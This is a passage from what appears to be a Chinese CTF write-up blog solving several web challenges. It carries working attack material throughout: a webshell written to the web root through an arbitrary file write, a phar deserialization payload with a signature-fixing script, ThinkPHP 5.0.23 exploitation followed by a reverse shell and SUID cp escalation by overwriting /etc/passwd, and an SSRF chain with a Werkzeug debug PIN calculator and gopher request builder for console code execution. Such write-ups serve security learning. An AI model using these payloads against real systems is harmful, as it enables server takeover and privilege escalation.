class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            echo $fffflag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__construct</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $this-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        $this-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="title function_">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__tostring</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;user.<span class="property">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__invoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$this-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            echo $nothing;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;<span class="title class_">God</span>==<span class="string">&#x27;true&#x27;</span>&amp;&amp;$this-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">system</span>($this-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="title function_">isset</span>($_GET[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    $pear=$_GET[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    $Adam=$_GET[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    $file=<span class="title function_">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_">file_put_contents</span>($pear,<span class="title function_">urldecode</span>($file));</span><br><span class="line">    <span class="title function_">file_exists</span>($Adam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>非预期了</p><p>由于没有控制路径</p><p>直接写马到网站根目录就行了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/pairing.<span class="property">php</span>?pear=<span class="regexp">/var/</span>www/html/a.<span class="property">php</span>&amp;apple=<span class="number">1</span></span><br><span class="line">x=<span class="title function_">system</span>(<span class="string">&#x27;cat /flllag&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988088416-7cd82ab6-f545-4824-8ccf-6e9813e9255a.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988099715-8340a7be-7dd9-4926-9ba8-a0a6b2ab7fb6.png" alt="img"></p><p>之后看看预期解学习</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>看了官方文档预期解来了</p><p>考察的phar重签名的知识点</p><p>首先恶意类利用很简单 只需要<code>__wakeup和__destruct</code>即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">story</span>&#123;</span><br><span class="line">    public $eating = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">    public $God=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>);</span><br><span class="line">$phar-&gt;<span class="title function_">startBuffering</span>();</span><br><span class="line">$phar-&gt;<span class="title function_">setStub</span>(<span class="string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> <span class="title function_">story</span>();</span><br><span class="line">$phar-&gt;<span class="title function_">setMetadata</span>($o);</span><br><span class="line">$phar-&gt;<span class="title function_">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;<span class="title function_">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><code>__wakeup</code>通过修改类属性个数绕过即可 这里就涉及到一个phar重签名的问题</p><p>因为我们的恶意payload是在phar文件中 生成phar之后修改类属性个数</p><p>按照官方WP</p><blockquote><p>phar的最后有一段signature，是phar的签名，放在文件末尾，要注意因为我们修改了文件的内容，之前的签名就会无效，所以需要更换一个新的签名</p></blockquote><p>修改签名脚本如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;Z1d10t.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> <span class="attr">file</span>:</span><br><span class="line">    f = file.<span class="title function_">read</span>()</span><br><span class="line">s = f[:-<span class="number">28</span>] # 获取要签名的数据</span><br><span class="line">h = f[-<span class="number">8</span>:] # 获取签名类型和<span class="variable constant_">GBMB</span>标识</span><br><span class="line">newf = s + <span class="title function_">sha1</span>(s).<span class="title function_">digest</span>() + h # 数据 + 签名 + (类型 + <span class="variable constant_">GBMB</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;ChangedPhar.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> <span class="attr">file</span>:</span><br><span class="line">    file.<span class="title function_">write</span>(newf) # 写入新文件</span><br></pre></td></tr></table></figure><p>然后将修改签名后的文件内容读出来url编码之后通过post传进去 </p><p>再通过<code>phar://</code>协议读取即可成功rce </p><p>但是我没复现成功  我反弹shell去看上传的文件内容也没错 但是就是不得解 不知道什么原因</p><p>用官方WP中的脚本 也不成功</p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>报错发现是thinkphp5.0.23 那么可以直接根据版本去找漏洞利用</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698479533782-f7d4c9e8-4bd6-4a96-b468-7e9225580e39.png" alt="img"></p><p>这里当时为了抢一血直接用工具梭哈了</p><p>写马到网站根目录下 发现禁了system 那么我们用passthru或者exec等无回显函数都可以 反正我们要进行反弹shell</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481376316-6c17aacc-a517-4047-95f5-cd46b8a6a792.png" alt="img"></p><p>记得payload要url编码一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481525990-8c6fad3d-f5c8-4968-afa3-4cfa7cf6d689.png" alt="img"></p><p>发现权限不够 涉及提权 那一般是考察suid提权 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481570952-e9ed3e3d-a994-4707-97f2-5fe5a50e12cf.png" alt="img"></p><p>看看哪些命令有suid</p><p>有cp 呢铁定是cp提权了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481643850-8aaf3276-06d0-4874-83c3-864ea8233ae4.png" alt="img"></p><p>直接把内容复制到&#x2F;etc&#x2F;passwd 然后拿flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481704911-05884a79-1873-4441-b306-6615bb8d8e1c.png" alt="img"></p><h2 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h2><p>这道题目应该借鉴的是SCTF2023的<code>pypyp？</code></p><p>考点：</p><ul><li>ssrf</li><li>flask pin码计算</li><li>gopher协议</li></ul><p>做这道题目之前庆幸学习了0xgame2023一道ssrf打redis主从复制题目</p><p>学习Aecous师傅的的WP:) 师傅太强力ORZ</p><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($_REQUEST[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $ch = <span class="title function_">curl_init</span>();</span><br><span class="line">        <span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_URL</span>, $_REQUEST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_CONNECTTIMEOUT</span>, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_HTTPHEADER</span>, $_REQUEST[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        $output = <span class="title function_">curl_exec</span>($ch);</span><br><span class="line">        echo $output;</span><br><span class="line">        <span class="title function_">curl_close</span>($ch);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="title class_">Error</span> $x)&#123;</span><br><span class="line">        <span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line">        <span class="title function_">highlight_string</span>($x-&gt;<span class="title function_">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>首先根据题目获取提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hint[]=your%3F&amp;hint[]=mine!&amp;hint[]=hint!!</span><br></pre></td></tr></table></figure><p>拿到了&#x2F;目录下的文件情况</p><p>可以醒目的发现app.py</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">total <span class="number">12</span></span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">51</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> .</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">51</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> ..</span><br><span class="line">-rwxr-xr-x    <span class="number">1</span> root root   <span class="number">0</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> .<span class="property">dockerenv</span></span><br><span class="line">-rwxr-xr-x    <span class="number">1</span> root root <span class="number">353</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">52</span> app.<span class="property">py</span></span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">7</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span>  <span class="number">8</span>  <span class="number">2021</span> boot</span><br><span class="line">drwxr-xr-x    <span class="number">5</span> root root <span class="number">360</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> dev</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">66</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> etc</span><br><span class="line">-rw-------    <span class="number">1</span> root root  <span class="number">43</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> flag</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span>  <span class="number">8</span>  <span class="number">2021</span> home</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">7</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">9</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">9</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root  <span class="number">10</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> libx32 -&gt; usr/libx32</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> media</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> mnt</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> opt</span><br><span class="line">dr-xr-xr-x <span class="number">3110</span> root root   <span class="number">0</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> proc</span><br><span class="line">drwx------    <span class="number">1</span> root root  <span class="number">20</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">52</span> root</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">21</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">50</span> run</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">8</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> srv</span><br><span class="line">-rwx------    <span class="number">1</span> root root <span class="number">241</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">52</span> start.<span class="property">sh</span></span><br><span class="line">dr-xr-xr-x   <span class="number">13</span> root root   <span class="number">0</span> <span class="title class_">Sep</span> <span class="number">19</span> <span class="number">01</span>:<span class="number">23</span> sys</span><br><span class="line">drwxrwxrwt    <span class="number">1</span> root root   <span class="number">6</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> tmp</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">19</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> usr</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">17</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">49</span> <span class="keyword">var</span></span><br></pre></td></tr></table></figure><p>那么通过file伪协议去读取文件<code>?url=file://127.0.0.1/app.py&amp;lolita[]=1</code></p><p>app.py</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line">#<span class="keyword">from</span> <span class="title class_">NeepuF1Le</span> <span class="keyword">import</span> neepu_files</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">app.<span class="property">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;******&#x27;</span></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;islogin&quot;</span>] == <span class="title class_">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;***********************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">run</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1314</span>, debug=<span class="title class_">True</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以看到我们要么能获取key伪造session 但是同时我们还得有地方去调用这个welcome函数才行</p><p>仔细观察它的debug是开启的 并且我们还可以读文件 那么一眼就知道是要去算pin码然后rce了 前面的内容只是噱头</p><p>计算pin码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  # /etc/passwd</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  # 默认值</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  # 默认值</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27;</span>  # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;112581235869047&#x27;</span>,  # /sys/<span class="keyword">class</span>/net/eth0/address 十进制</span><br><span class="line">    <span class="string">&#x27;8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.scope&#x27;</span></span><br><span class="line">    #8cab9c97-85be-4fb4-9d17-29335d7b2b8a</span><br><span class="line">    #docker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.<span class="property">scope</span></span><br><span class="line">    # 字符串合并：<span class="number">1.</span>/etc/machine-<span class="title function_">id</span>(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id <span class="number">2.</span> /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下面为源码里面抄的，不需要修改</span><br><span class="line">h = hashlib.<span class="title function_">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="title function_">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">bit</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.<span class="title function_">update</span>(bit)</span><br><span class="line">h.<span class="title function_">update</span>(b<span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.<span class="title function_">hexdigest</span>()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> num is <span class="title class_">None</span>:</span><br><span class="line">    h.<span class="title function_">update</span>(b<span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="title function_">int</span>(h.<span class="title function_">hexdigest</span>(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> rv is <span class="title class_">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.<span class="title function_">join</span>(num[<span class="attr">x</span>:x + group_size].<span class="title function_">rjust</span>(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0</span>, <span class="title function_">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rv)</span><br></pre></td></tr></table></figure><p>这里关于<code>/proc/self/cgroup</code>这里的内容和我们一般做题时获取的不太一样 不过记住一点就行了</p><p><code>取第一行的最后一个斜杠/后面的所有字符串</code>那么肯定是对的</p><p>计算得pin码 <code>397-838-235</code></p><p>接下来的思路就是 要通过gopher协议去访问内网中<code>/console</code>路由并且进行RCE</p><p>但是由于debugmode的rce需要携带cookie 所以我们还需要去计算cookie</p><p>因为<code>/console</code>是在内网的1314端口中 所以我们没法直接通过浏览器进入debug的控制台</p><p>这里就需要手算cookie了</p><p>方法参考：<a href="https://unk.icu/2023/06/19/flask-pin/">flask-pin</a>  神！[SCTF2023 Web WriteUp - Boogiepop Doesn’t Laugh](<a href="https://boogipop.com/2023/06/20/SCTF2023">https://boogipop.com/2023/06/20/SCTF2023</a> Web WriteUp&#x2F;)</p><p>发送验证pin码的请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?__debugger__=yes&amp;cmd=pinauth&amp;pin=397-838-235&amp;s=hCYJBiBvCDHEJqflrGtk</span><br></pre></td></tr></table></figure><p>需要拿到s 直接访问&#x2F;console 可以在源代码中拿到</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483592278-60ae86c4-b0cb-4206-8cf7-23eae59b1225.png" alt="img"></p><p>然后记得编码打入<code>?url=http://127.0.0.1:1314/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=397-838-235&amp;s=hCYJBiBvCDHEJqflrGtk&amp;lolita[]=1</code> 验证pin码计算正确的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483692006-fad9b10a-ab71-43e3-b358-5586d7458a08.png" alt="img"></p><p>然后我们要进行rce还需要携带cookie</p><h3 id="第一种方式-脚本计算"><a href="#第一种方式-脚本计算" class="headerlink" title="第一种方式 脚本计算"></a>第一种方式 脚本计算</h3><p>需要计算cookie 这里直接用到一个现成的脚本：<a href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code">GitHub - WiIs0n&#x2F;Flask-cookie-generation-based-on-PIN-code: This script generates a Cookie based on a legitimate PIN code.</a></p><p>同时可以计算出pin和cookie</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698484036732-b9d7526a-ee26-4ba4-be46-a4cf5797e8c0.png" alt="img"></p><h3 id="第二种方式gopher发包"><a href="#第二种方式gopher发包" class="headerlink" title="第二种方式gopher发包"></a>第二种方式gopher发包</h3><p>利用gopher协议发包 通过返回包获取到cookie</p><p>脚本如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">request</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">PAYLOAD</span>(s,cmd,host,pin):</span><br><span class="line"></span><br><span class="line">    poc = f<span class="string">&quot;&quot;</span><span class="string">&quot;GET /console?&amp;__debugger__=yes&amp;pin=&#123;pin&#125;&amp;cmd=&#123;cmd&#125;&amp;frm=0&amp;s=&#123;s&#125; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;host&#125;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    new_poc = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(poc).<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">    res = f<span class="string">&#x27;gopher://&#123;host&#125;/_&#x27;</span> + new_poc</span><br><span class="line">    <span class="title function_">print</span>(res)</span><br><span class="line">    <span class="keyword">return</span> urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;pinauth&quot;</span></span><br><span class="line">s= <span class="string">&quot;hCYJBiBvCDHEJqflrGtk&quot;</span></span><br><span class="line">host=<span class="string">&quot;127.0.0.1:1314&quot;</span></span><br><span class="line">#cookie = <span class="string">&quot;__wzdaa31f34934bb24e966f6=1698068595|d4af8efd2a4d&quot;</span></span><br><span class="line">pin = <span class="string">&quot;397-838-235&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="title function_">PAYLOAD</span>(s,cmd,host,pin)</span><br><span class="line"><span class="title function_">print</span>(a)</span><br></pre></td></tr></table></figure><p>可见我们通过脚本计算出来的 cookie也是正确的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485116132-4b195cc5-160e-4156-be43-10df30b6fe65.png" alt="img"></p><p>计算出cookie之后就不用携带pin了 